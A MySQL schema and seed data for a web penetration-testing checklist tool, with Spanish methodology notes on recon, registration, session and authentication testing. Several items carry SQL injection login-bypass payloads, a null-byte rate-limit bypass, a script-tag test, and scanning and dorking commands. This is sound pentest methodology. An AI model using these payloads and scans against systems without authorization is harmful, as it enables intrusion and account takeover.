SET NAMES utf8mb4;
SET CHARACTER SET utf8mb4;

-- Taula d'usuaris
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(100) NOT NULL UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO users (name, email) VALUES 
    ('Test User', 'test@example.com'),
    ('Admin', 'admin@example.com');

-- Taula de projectes
CREATE TABLE IF NOT EXISTS projects (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    status VARCHAR(50) DEFAULT 'active',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Taula de targets (objectius dins de cada projecte)
CREATE TABLE IF NOT EXISTS targets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    project_id INT NOT NULL,
    name VARCHAR(255) NOT NULL,
    target VARCHAR(500),
    target_type ENUM('url', 'ip', 'domain') DEFAULT 'url',
    description TEXT,
    status VARCHAR(50) DEFAULT 'active',
    progress DECIMAL(5,2) DEFAULT 0.00,
    notes TEXT,
    aggregated_notes TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Taula de categories de testing
CREATE TABLE IF NOT EXISTS categories (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    order_num INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Taula de checklist items (plantilla base)
CREATE TABLE IF NOT EXISTS checklist_items (
    id INT AUTO_INCREMENT PRIMARY KEY,
    category_id INT NOT NULL,
    title TEXT NOT NULL,
    description TEXT,
    order_num INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (category_id) REFERENCES categories(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Taula de checklist per target (còpia de la checklist per cada target)
CREATE TABLE IF NOT EXISTS target_checklist (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target_id INT NOT NULL,
    checklist_item_id INT NOT NULL,
    is_checked BOOLEAN DEFAULT FALSE,
    notes TEXT,
    severity ENUM('low', 'medium', 'high', 'critical', 'info') DEFAULT 'info',
    checked_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE,
    FOREIGN KEY (checklist_item_id) REFERENCES checklist_items(id) ON DELETE CASCADE,
    UNIQUE KEY unique_target_item (target_id, checklist_item_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Taula d'historial de notas
CREATE TABLE IF NOT EXISTS notes_history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target_id INT NOT NULL,
    checklist_item_id INT NOT NULL,
    old_notes TEXT,
    new_notes TEXT,
    severity VARCHAR(50),
    changed_by VARCHAR(100) DEFAULT 'system',
    change_type ENUM('created', 'updated', 'deleted', 'severity_changed') DEFAULT 'updated',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE,
    FOREIGN KEY (checklist_item_id) REFERENCES checklist_items(id) ON DELETE CASCADE,
    INDEX idx_target_id (target_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Augmentar el límit de GROUP_CONCAT globalment
SET GLOBAL group_concat_max_len = 10000000;

-- Trigger per actualitzar automàticament les notes del target (INSERT)
DELIMITER //

CREATE TRIGGER update_target_notes_on_insert
AFTER INSERT ON target_checklist
FOR EACH ROW
BEGIN
    DECLARE v_old_notes TEXT;
    
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial
    INSERT INTO notes_history (target_id, checklist_item_id, new_notes, severity, change_type, created_at)
    VALUES (NEW.target_id, NEW.checklist_item_id, NEW.notes, NEW.severity, 'created', NOW());
    
    -- Actualizar notas agregadas solo si hay notas
    IF NEW.notes IS NOT NULL AND NEW.notes != '' THEN
        UPDATE targets 
        SET aggregated_notes = (
            SELECT GROUP_CONCAT(
                CONCAT(
                    '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                    UPPER(tc.severity), ': ',
                    ci.title, '\n', 
                    tc.notes
                )
                SEPARATOR '\n\n---\n\n'
            )
            FROM target_checklist tc
            INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
            WHERE tc.target_id = NEW.target_id 
            AND tc.notes IS NOT NULL 
            AND tc.notes != ''
            ORDER BY tc.updated_at DESC
        )
        WHERE id = NEW.target_id;
    END IF;
END//

-- Trigger per actualitzar automàticament les notes del target (UPDATE)
CREATE TRIGGER update_target_notes_on_update
AFTER UPDATE ON target_checklist
FOR EACH ROW
BEGIN
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial si las notas cambiaron
    IF OLD.notes != NEW.notes OR OLD.severity != NEW.severity THEN
        INSERT INTO notes_history (target_id, checklist_item_id, old_notes, new_notes, severity, change_type, created_at)
        VALUES (NEW.target_id, NEW.checklist_item_id, OLD.notes, NEW.notes, NEW.severity, 'updated', NOW());
    END IF;
    
    -- Actualizar notas agregadas
    UPDATE targets 
    SET aggregated_notes = (
        SELECT GROUP_CONCAT(
            CONCAT(
                '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                UPPER(tc.severity), ': ',
                ci.title, '\n', 
                tc.notes
            )
            SEPARATOR '\n\n---\n\n'
        )
        FROM target_checklist tc
        INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
        WHERE tc.target_id = NEW.target_id 
        AND tc.notes IS NOT NULL 
        AND tc.notes != ''
        ORDER BY tc.updated_at DESC
    )
    WHERE id = NEW.target_id;
END//

-- Trigger per actualitzar automàticament les notes del target (DELETE)
CREATE TRIGGER update_target_notes_on_delete
AFTER DELETE ON target_checklist
FOR EACH ROW
BEGIN
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial
    INSERT INTO notes_history (target_id, checklist_item_id, old_notes, change_type, created_at)
    VALUES (OLD.target_id, OLD.checklist_item_id, OLD.notes, 'deleted', NOW());
    
    -- Actualizar notas agregadas
    UPDATE targets 
    SET aggregated_notes = (
        SELECT GROUP_CONCAT(
            CONCAT(
                '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                UPPER(tc.severity), ': ',
                ci.title, '\n', 
                tc.notes
            )
            SEPARATOR '\n\n---\n\n'
        )
        FROM target_checklist tc
        INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
        WHERE tc.target_id = OLD.target_id 
        AND tc.notes IS NOT NULL 
        AND tc.notes != ''
        ORDER BY tc.updated_at DESC
    )
    WHERE id = OLD.target_id;
END//

DELIMITER ;

-- Inserir categories
INSERT INTO categories (name, description, order_num) VALUES
('Recon Phase', 'Reconnaissance and information gathering', 1),
('Registration Feature Testing', 'Testing user registration functionality', 2),
('Session Management Testing', 'Testing session handling and cookies', 3),
('Authentication Testing', 'Testing login and authentication mechanisms', 4),
('My Account (Post Login) Testing', 'Testing post-authentication features', 5),
('Forgot Password Testing', 'Testing password recovery functionality', 6),
('Contact Us Form Testing', 'Testing contact forms', 7),
('Product Purchase Testing', 'Testing e-commerce functionality', 8),
('Banking Application Testing', 'Testing banking-specific features', 9),
('Open Redirection Testing', 'Testing for open redirect vulnerabilities', 10),
('Host Header Injection', 'Testing Host header manipulation', 11),
('SQL Injection Testing', 'Testing for SQL injection vulnerabilities', 12),
('Cross-Site Scripting Testing', 'Testing for XSS vulnerabilities', 13),
('CSRF Testing', 'Testing for Cross-Site Request Forgery', 14),
('SSO Vulnerabilities', 'Testing Single Sign-On implementations', 15),
('XML Injection Testing', 'Testing for XXE vulnerabilities', 16),
('CORS', 'Cross-Origin Resource Sharing testing', 17),
('SSRF', 'Server-Side Request Forgery testing', 18),
('File Upload Testing', 'Testing file upload functionality', 19),
('CAPTCHA Testing', 'Testing CAPTCHA implementations', 20),
('JWT Token Testing', 'Testing JSON Web Tokens', 21),
('Websockets Testing', 'Testing WebSocket connections', 22),
('GraphQL Vulnerabilities Testing', 'Testing GraphQL implementations', 23),
('WordPress Common Vulnerabilities', 'Testing WordPress-specific issues', 24),
('XPath Injection', 'Testing XPath injection vulnerabilities', 25),
('LDAP Injection', 'Testing LDAP injection vulnerabilities', 26),
('Denial of Service', 'Testing DoS vulnerabilities', 27),
('403 Bypass', 'Testing access control bypasses', 28),
('Other Test Cases', 'Miscellaneous security tests', 29),
('Burp Suite Extensions', 'Useful Burp Suite extensions', 30);

-- Inserir items de Recon Phase con descripciones tipo "Guía Maestra"
INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(1, 'Identify web server, technologies and database', 'Identifica la pila tecnológica para buscar CVEs específicos.\n\n- **Headers:** Busca `Server`, `X-Powered-By`, `X-AspNet-Version`.\n- **Cookies:** `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASPSESSIONID` (ASP).\n- **WAF:** Ejecuta `wafw00f <url>` para ver si hay firewall.\n- **CMS:** Si es WordPress/Joomla, usa `wpscan` o `joomscan`.\n\n**Herramientas:** `Wappalyzer` (Extensión), `WhatWeb -a 3 <url>`, `BuiltWith`.', 1),

(1, 'Subsidiary and Acquisition Enumeration', 'Las empresas grandes son seguras; sus filiales nuevas no. Amplía el alcance (Scope).\n\n- **Finanzas:** Busca en Crunchbase o Google Finance "adquisiciones recientes".\n- **Legal:** Revisa los términos y condiciones o el pie de página para ver nombres de empresas legales.\n- **ASN:** Verifica si las subsidiarias usan el mismo ASN o uno propio.\n\n**Recursos:** `Crunchbase`, `Wikipedia`, `Registros WHOIS`.', 2),

(1, 'Reverse Lookup', 'Descubre qué otros sitios conviven en el mismo servidor (Virtual Hosting).\n\n- **Riesgo:** Si un sitio vecino es vulnerable, puedes escalar privilegios al servidor y atacar tu objetivo desde dentro.\n- **Acción:** Toma la IP del objetivo y busca todos los dominios asociados.\n\n**Herramientas:** `DNSDumpster`, `Bing (ip:x.x.x.x)`, `hackertarget.com`.', 3),

(1, 'ASN & IP Space Enumeration and Service Enumeration', 'No te limites al dominio principal. Mapea toda la red.\n\n- **ASN:** Encuentra el "Autonomous System Number" de la empresa (e.g., AS1234).\n- **CIDR:** Obtén los rangos de IP (e.g., 192.168.0.0/24).\n- **Comando:** `whois -h whois.radb.net -- ''-i origin AS1234'' | grep -Eo "([0-9.]+){4}/[0-9]+"`\n\n**Herramientas:** `Amass intel -org <empresa>`, `BGP.he.net`.', 4),

(1, 'Google Dorking', 'Hacking sin tocar el servidor. Usa la "Google Hacking Database" (GHDB).\n\n- **Fugas:** `site:target.com ext:log OR ext:txt OR ext:conf`\n- **Paneles:** `site:target.com inurl:login OR intitle:"Index of"`\n- **Nube:** `site:s3.amazonaws.com "target"`\n- **Backup:** `site:target.com ext:bak OR ext:old`\n\n**Recurso:** `Exploit-DB GHDB`, `DorkSearch`.', 5),

(1, 'Github Recon', 'Busca secretos filtrados por desarrolladores.\n\n- **Queries:** Busca "target.com" + "password", "api_key", "aws_access_key", "secret".\n- **Usuarios:** Investiga los perfiles personales de los empleados de la organización.\n- **Historial:** A veces borran la clave, pero queda en el historial de commits.\n\n**Herramientas:** `GitRob`, `TruffleHog`, `Gitleaks`, `Dorks en GitHub`.', 6),

(1, 'Directory Enumeration', 'Encuentra lo que el administrador quería esconder.\n\n- **Wordlists:** Usa `SecLists` (Discovery/Web-Content/raft-large-words.txt).\n- **Extensiones:** No olvides buscar `.php`, `.zip`, `.bak`, `.sql`.\n- **Recursividad:** Si encuentras `/admin`, escanea dentro de esa carpeta.\n\n**Herramientas:** `Feroxbuster` (Recomendado), `Gobuster dir`, `Dirsearch`.', 7),

(1, 'IP Range Enumeration', 'Una vez tengas los rangos CIDR, busca máquinas vivas.\n\n- **Ping Sweep:** `nmap -sn -iL rangos.txt -oG vivos.txt`\n- **Objetivo:** Encontrar servidores de desarrollo, staging o bases de datos expuestas que no tienen dominio DNS asignado.\n\n**Herramientas:** `Masscan` (Velocidad), `Nmap` (Precisión).', 8),

(1, 'JS Files Analysis', 'El código JavaScript del cliente contiene el mapa de la API.\n\n- **Búsqueda:** Busca rutas relativas (`/api/v1/user`), claves API y comentarios (`// TODO`).\n- **Source Maps:** Si encuentras archivos `.js.map`, puedes reconstruir el código original legible.\n\n**Herramientas:** `LinkFinder` (Extraer endpoints), `GetJS`, Herramientas de desarrollo del navegador.', 9),

(1, 'Subdomain Enumeration and Bruteforcing', 'La fase más crítica. Más subdominios = Más superficie de ataque.\n\n- **Pasiva:** `Subfinder`, `Crt.sh` (Certificados SSL).\n- **Activa:** `Puredns` o `ShuffleDNS` con un wordlist masivo (e.g., `best-dns-wordlist.txt`).\n- **Permutaciones:** Genera variaciones (`dev-api`, `api-prod`) con `Altdns`.\n\n**Flujo:** Pasivo -> Activo -> Permutación -> Resolución.', 10),

(1, 'Subdomain Takeover', 'Roba subdominios olvidados.\n\n- **Detección:** Busca CNAMEs que apunten a servicios (AWS, GitHub, Heroku) que devuelvan errores como "NoSuchBucket" o "404 Not Found".\n- **Impacto:** Si lo registras, controlas el contenido que se sirve desde un subdominio legítimo de la empresa (Phishing, Cookies).\n\n**Herramientas:** `Subjack`, `Nuclei -t takeovers`.', 11),

(1, 'Parameter Fuzzing', 'Encuentra parámetros ocultos en endpoints válidos.\n\n- **Caso:** Tienes `search.php`. ¿Acepta `?debug=true` o `?admin=1`?\n- **Wordlists:** Usa listas de nombres de parámetros comunes (`id`, `user`, `admin`, `cmd`).\n- **Métodos:** Prueba GET y POST.\n\n**Herramientas:** `Arjun` (Recomendado), `ParamSpider`, `x8`.', 12),

(1, 'Port Scanning', 'Identifica servicios no-web.\n\n- **Escaneo Total:** `nmap -p- -sS --min-rate 5000 -v <ip>`\n- **Detalle:** Sobre los puertos abiertos: `nmap -p <puertos> -sC -sV`.\n- **Ojo:** No olvides UDP si es relevante (`-sU`), aunque es lento.\n\n**Herramientas:** `Nmap`, `RustScan` (Muy rápido), `Naabu`.', 13),

(1, 'Template-Based Scanning (Nuclei)', 'Automatización de vulnerabilidades modernas.\n\n- **Uso:** Escanea tu lista de subdominios vivos con plantillas de la comunidad.\n- **Comando:** `nuclei -l subdominios.txt -t cves/ -t misconfiguration/`\n- **Tip:** Mantén las plantillas actualizadas (`nuclei -update-templates`).\n\n**Herramienta:** `ProjectDiscovery Nuclei`.', 14),

(1, 'Wayback History', 'El archivo de internet es una mina de oro.\n\n- **Qué buscar:** Archivos `robots.txt` antiguos, rutas de API viejas (`/v1/` vs `/v2/`), y parámetros GET en URLs archivadas.\n- **Comparación:** Compara el mapa del sitio actual con el de hace 2 años.\n\n**Herramientas:** `Waymore` (Mejor que waybackurls), `Gau`, `Tomnomnom tools`.', 15),

(1, 'Broken Link Hijacking', 'Verifica todos los enlaces externos.\n\n- **Escenario:** La web enlaza al Twitter `@empresa_support`. Esa cuenta fue borrada. Tú la registras y ahora eres el soporte oficial.\n- **Escenario 2:** Scripts JS cargados desde dominios expirados (XSS Stored).\n\n**Herramientas:** `Broken-link-checker`, `SocialHunter`.', 16),

(1, 'Internet Search Engine Discovery', 'Inteligencia de fuentes abiertas sobre infraestructura.\n\n- **Shodan:** Busca `ssl:"Target Name"` o `org:"Target Name"`.\n- **Censys:** Busca certificados SSL asociados al dominio.\n- **Bypass WAF:** A veces Shodan revela la IP de origen real detrás de Cloudflare.\n\n**Motores:** `Shodan.io`, `Censys.io`, `ZoomEye`.', 17),

(1, 'Misconfigured Cloud Storage', 'Busca cubos (buckets) públicos.\n\n- **Nombres:** Genera permutaciones: `empresa-backup`, `empresa-dev`, `empresa-logs`.\n- **Test:** Intenta listar (`ls`) o subir archivos (`cp test.txt s3://...`).\n- **Azure/GCP:** No olvides los Blobs de Azure y Buckets de Google.\n\n**Herramientas:** `Cloud_enum`, `AWS CLI`, `Lazys3`.', 18);

-- ==========================================
-- CATEGORY: Registration Feature Testing (ID 2)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(2, 'Check for duplicate registration/Overwrite existing user', 'Verifica si es posible secuestrar cuentas o duplicar datos.\n\n- **Race Condition:** Intenta registrar el mismo usuario en 2 hilos simultáneos (Burp Intruder).\n- **Overwrite:** Si registras un usuario que ya existe, ¿se sobrescribe la contraseña?\n- **Case Sensitivity:** ¿Trata `Admin` y `admin` como usuarios diferentes?\n\n**Impacto:** Toma de control de cuentas (Account Takeover).', 1),

(2, 'Check for weak password policy', 'La primera línea de defensa contra fuerza bruta.\n\n- **Validación:** Comprueba si la validación es solo en el cliente (JavaScript) eliminándola con Burp.\n- **Tests:** Intenta registrarte con `123456`, `password`, o el mismo nombre de usuario.\n- **Límites:** Verifica longitud mínima (8+) y complejidad.\n\n**Herramientas:** Listas de contraseñas comunes (`RockYou.txt` top 1000).', 2),

(2, 'Check for reuse existing usernames', 'Enumeración de usuarios (User Enumeration).\n\n- **Error Messages:** Compara las respuestas. \n  - "User created" vs "Username taken" -> **Vulnerable** (Permite enumerar usuarios).\n  - "Check your email" (para ambos casos) -> **Seguro**.\n- **Timing:** Mide el tiempo de respuesta. Si tarda más cuando el usuario existe, es una vulnerabilidad de tiempo.', 3),

(2, 'Check for insufficient email verification process', 'Evita el acceso a funciones autenticadas sin validar el correo.\n\n- **Forced Browsing:** Regístrate, no valides el email, e intenta navegar a `/dashboard` o `/profile`.\n- **Token:** Verifica si el token de activación es predecible o secuencial.\n- **Reutilización:** ¿El mismo enlace de activación funciona dos veces?', 4),

(2, 'Weak registration implementation-Allows disposable email addresses', 'Abuso de lógica de negocio (Spam/Freemium).\n\n- **Prueba:** Intenta registrarte con dominios temporales.\n- **Dominios:** `@mailinator.com`, `@guerrillamail.com`, `@10minutemail.com`.\n- **Riesgo:** Permite a atacantes crear cuentas bot masivas o saltarse bloqueos.\n\n**Herramientas:** Scripts de validación de MX.', 5),

(2, 'Weak registration implementation-Over HTTP', 'Credenciales en texto plano.\n\n- **Sniffing:** Si el registro viaja por HTTP, cualquiera en la red (WiFi pública) puede ver el usuario y contraseña.\n- **SSL Strip:** Verifica si el sitio fuerza HTTPS o permite downgrade a HTTP.\n\n**Herramientas:** `Wireshark`, `Burp Suite Proxy` (Verifica el protocolo en el historial).', 6),

(2, 'Overwrite default web application pages by specially crafted username registrations', 'Escalada de privilegios vía nombres reservados.\n\n- **Concepto:** ¿Qué pasa si te registras como `admin`, `support`, `test` o `ftp`?\n- **Rutas:** Si el perfil de usuario es `site.com/usuario`, registrarse como `admin` podría bloquear el acceso al panel real de administración (`site.com/admin`).\n- **Payloads:** Prueba también caracteres especiales: `admin"`, `admin''`, `<script>`.', 7);

-- ==========================================
-- CATEGORY: Session Management Testing (ID 3)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(3, 'Identify actual session cookie out of bulk cookies in the application', 'No todas las cookies son para autenticación.\n\n- **Análisis:** Identifica cuál mantiene la sesión activa (borra una a una y recarga la página).\n- **Nombres Comunes:** `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASPSESSIONID` (ASP), `connect.sid` (Node).\n- **Objetivo:** Enfoca tus ataques solo en la cookie crítica.', 1),

(3, 'Decode cookies using some standard decoding algorithms', 'Información sensible oculta a simple vista.\n\n- **Base64:** Si termina en `=`, intenta decodificar (`echo "val" | base64 -d`).\n- **JWT:** Si empieza por `ey...`, usa **jwt.io**. Verifica la firma y datos del payload.\n- **Hex/URL:** Decodifica `%xx` o cadenas hexadecimales.\n\n**Riesgo:** Fugas de información (Email, UserID, Roles) o Deserialización insegura.', 2),

(3, 'Modify cookie.session token value by 1 bit/byte', 'Prueba la aleatoriedad de la sesión (Entropy).\n\n- **Secuencialidad:** Si mi cookie es `...123`, ¿puedo acceder como otro usuario cambiando a `...124`?\n- **Análisis:** Usa **Burp Sequencer**. Captura miles de tokens para analizar si son realmente aleatorios.\n- **Objetivo:** Session Hijacking (Predicción de sesiones).', 3),

(3, 'If self-registration is available ... log in with a series of similar usernames', 'Problemas de "Canonicalization".\n\n- **Test:** Crea `usuarioA`. Intenta entrar como `UsuarioA` (Mayúsculas), `usuarioA ` (Espacio al final) o `uscarioA` (Caracteres Unicode visualmente idénticos).\n- **Riesgo:** Si el backend normaliza mal, podrías acceder a la cuenta de la víctima o causar denegación de servicio.', 4),

(3, 'Check for session cookies and cookie expiration date/time', '¿Cuánto vive una sesión?\n\n- **Idle Timeout:** Deja la sesión inactiva 15 min. Recarga. ¿Sigues logueado?\n- **Absolute Timeout:** ¿La sesión muere a las 24h aunque estés activo?\n- **Persistencia:** Si cierras el navegador y lo abres, ¿sigues dentro? (Malo para banca, aceptable para redes sociales).', 5),

(3, 'Identify cookie domain scope', 'Verifica quién puede leer la cookie.\n\n- **Scope Laxo:** Si `Domain=.site.com`, la cookie se envía a `subdominio.site.com`.\n- **Ataque:** Si controlas un subdominio (o encuentras XSS en uno), puedes robar la sesión del dominio principal.\n- **Ideal:** El atributo `Domain` debería estar vacío (Host-Only) o ser muy restrictivo.', 6),

(3, 'Check for HttpOnly flag in cookie', 'Protección contra XSS.\n\n- **Prueba:** Abre la consola del navegador (`F12`) y escribe `document.cookie`.\n- **Resultado:** Si ves la cookie de sesión ahí, **FALTA el flag HttpOnly**.\n- **Impacto:** Un ataque XSS simple puede robar la sesión y enviarla al atacante.', 7),

(3, 'Check for Secure flag in cookie if the application is over SSL', 'Protección contra interceptación.\n\n- **Verificación:** Inspecciona la cookie en Burp o DevTools.\n- **Flag:** Debe tener `Secure` activado.\n- **Prueba:** Intenta cambiar la URL de `https://` a `http://`. Si la cookie se envía igual, es vulnerable a intercepción (Man-in-the-Middle).', 8),

(3, 'Check for session fixation i.e. value of session cookie before and after authentication', 'El ataque clásico de fijación de sesión.\n\n1. Entra al sitio (sin loguearte) y anota la cookie (e.g., `SESS=123`).\n2. Loguéate con tus credenciales.\n3. Verifica la cookie.\n\n**Vulnerable:** Si la cookie sigue siendo `SESS=123`.\n**Seguro:** El servidor debe emitir una **nueva** cookie (e.g., `SESS=456`) al autenticarse.', 9),

(3, 'Replay the session cookie from a different effective IP address or system', '¿La sesión viaja con el usuario?\n\n- **Escenario:** Robas una cookie válida. ¿Puedes usarla desde tu PC (otra IP/User-Agent)?\n- **Prueba:** Loguéate en Chrome. Copia la cookie a Firefox o úsala desde una VPN.\n- **Resultado:** Si funciona, la sesión no está vinculada a la IP/Fingerprint (Riesgo alto de robo).', 10),

(3, 'Check for concurrent login through different machine/IP', 'Gestión de sesiones múltiples.\n\n- **Test:** Loguéate en PC. Luego en Móvil.\n- **Observa:** ¿Se cierra la sesión del PC? (Single Session Policy).\n- **Banca:** Generalmente debería permitir solo una sesión activa.\n- **General:** Verifica si hay un panel para "Cerrar otras sesiones".', 11),

(3, 'Check if any user pertaining information is stored in cookie value or not', 'Fuga de datos en el cliente.\n\n- **Inspección:** Mira el contenido de todas las cookies.\n- **Banderas rojas:** `role=admin`, `user_id=101`, `email=test@test.com` en texto plano.\n- **Riesgo:** Si modificas `role=admin` a `role=superadmin`, ¿el servidor lo cree? (Mass Assignment en cookies).', 12),

(3, 'Failure to Invalidate Session on (Email Change,2FA Activation)', 'La prueba de revocación crítica.\n\n- **Escenario:** Un atacante tiene acceso a tu cuenta. Tú cambias la contraseña para echarlo.\n- **Test:**\n  1. Loguearse en Navegador A (Víctima) y Navegador B (Atacante).\n  2. En Navegador A, cambia la contraseña.\n  3. Navegador B **debe** ser desconectado inmediatamente.\n- **Fallo:** Si el Navegador B sigue activo, el cambio de contraseña es inútil para recuperar una cuenta hackeada.', 13);

-- ==========================================
-- CATEGORY: Authentication Testing (ID 4)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(4, 'Username enumeration', 'Determina si un usuario existe basándote en la respuesta del servidor.\n\n- **Mensajes:** "User not found" vs "Incorrect password".\n- **Tiempo:** Si el login tarda 200ms para usuario inválido y 500ms para válido (por el hashing de la password), es vulnerable (Timing Attack).\n- **Forgot Password:** Si dice "Email enviado" vs "Email no registrado".\n\n**Herramientas:** `Burp Intruder` (Pitchfork para correlacionar tiempos).', 1),

(4, 'Bypass authentication using various SQL Injections', 'Saltea el login manipulando la consulta SQL subyacente.\n\n- **Lógica:** Convertir `SELECT * FROM users WHERE user=''$u'' AND pass=''$p''` en una tautología (siempre verdadero).\n- **Payloads Username:**\n  - `admin'' --`\n  - `admin'' #`\n  - `admin'' OR 1=1 --`\n  - `'' OR ''1''=''1`\n\n**Objetivo:** Loguearse como el primer usuario de la DB (usualmente el Admin).', 2),

(4, 'Lack of password confirmation on Change email address', 'Mecanismo crítico para evitar el Account Takeover (ATO).\n\n- **Escenario:** Dejas tu sesión abierta en un cibercafé. Un atacante cambia tu email por el suyo. Luego hace "Reset Password".\n- **Prueba:** Intenta cambiar el email sin introducir la contraseña actual.\n- **Resultado:** Si lo permite, el atacante puede secuestrar la cuenta fácilmente.', 3),

(4, 'Lack of password confirmation on Change password', 'Verificación de identidad antes de acciones sensibles.\n\n- **Vulnerabilidad:** CSRF en el cambio de contraseña.\n- **Prueba:** Si no pide la "Current Password", un atacante podría crear un formulario oculto (CSRF) que, al visitarlo la víctima, cambie su contraseña automáticamente.', 4),

(4, 'Lack of password confirmation on Manage 2FA', 'Protección de la configuración de seguridad.\n\n- **Riesgo:** Un atacante con acceso temporal (físico o XSS) desactiva el 2FA o cambia el número de teléfono.\n- **Prueba:** Intenta desactivar el 2FA. El sistema **debe** pedir contraseña o un código OTP antes de confirmar la baja.', 5),

(4, 'Is it possible to use resources without authentication? Access violation', 'Broken Access Control / Forced Browsing.\n\n- **Prueba:** Navega como usuario autenticado. Copia las URLs (`/admin/users`, `/invoice/123`). Cierra sesión o usa modo incógnito e intenta acceder a esas URLs.\n- **API:** Haz lo mismo con llamadas API, eliminando el header `Authorization`.\n- **Archivos:** Intenta acceder directamente a `/uploads/private/dni.pdf`.', 6),

(4, 'Check if user credentials are transmitted over SSL or not', 'Protección de datos en tránsito.\n\n- **Verificación:** Usa `Wireshark` o `Burp Proxy`.\n- **Payload:** Busca peticiones `POST /login`. Si el esquema es `http://` en lugar de `https://`, las credenciales van en texto plano.\n- **Riesgo:** Robo de credenciales en redes WiFi públicas (Man-in-the-Middle).', 7),

(4, 'Weak login function HTTP and HTTPS both are available', 'Falta de HSTS o redirección forzada.\n\n- **Downgrade Attack:** Si el sitio soporta ambos, un atacante (MITM) puede forzar al usuario a usar la versión HTTP insegura.\n- **Prueba:** Cambia manualmente `https://` por `http://` en la URL del login. Si la página carga sin redirigir a HTTPS, es vulnerable.', 8),

(4, 'Test user account lockout mechanism on brute force attack', 'Protección contra adivinación de contraseñas.\n\n- **Prueba:** Intenta loguearte 5-10 veces con contraseña incorrecta.\n- **Esperado:** "Cuenta bloqueada por 30 minutos" o Captcha.\n- **Vulnerable:** Si permite intentos infinitos, se puede usar `Hydra` o `Burp Intruder` para crackear la contraseña.', 9),

(4, 'Bypass rate limiting by tampering user agent to Mobile User agent', 'Engañando al firewall de aplicaciones (WAF).\n\n- **Lógica:** A veces los desarrolladores relajan la seguridad para apps móviles para evitar bloqueos por cambio de IP (4G/WiFi).\n- **Prueba:** Cambia el `User-Agent` a `Mozilla/5.0 (iPhone; CPU iPhone OS...)`. Reintenta el ataque de fuerza bruta.', 10),

(4, 'Bypass rate limiting by tampering user agent to Anonymous user agent', 'Evasión de filtros basados en firmas.\n\n- **Prueba:** Algunos WAF bloquean User-Agents vacíos o de herramientas (`curl`, `python-requests`).\n- **Acción:** Rota el User-Agent en cada petición o usa una cadena aleatoria (`User-Agent: my-browser-v1`).', 11),

(4, 'Bypass rate liniting by using null byte', 'Confusión en el backend.\n\n- **Payload:** `username=admin%00`\n- **Teoría:** El sistema de bloqueo registra "admin%00". El sistema de login (escrito en C/C++ backend) lee hasta el null byte y ve "admin".\n- **Resultado:** Puedes atacar la misma cuenta infinitas veces porque el bloqueo no reconoce al usuario real.', 12),

(4, 'Create a password wordlist using cewl command', 'Generación de diccionarios contextuales.\n\n- **Herramienta:** `CeWL` (Custom Word List generator).\n- **Comando:** `cewl -d 2 -m 5 https://target.com -w target_dict.txt`\n- **Uso:** Las empresas suelen usar el nombre de la empresa, productos o año en sus contraseñas (e.g., `Empresa2024!`).', 13),

(4, 'Test Oauth login functionality', 'Verificación general del flujo OAuth.\n\n\n\n- **Objetivo:** Verificar si la implementación sigue el estándar RFC 6749 o si tiene atajos inseguros.\n- **Check:** ¿Usa `state`? ¿Valida `redirect_uri`? ¿Expira el `code`?', 14),

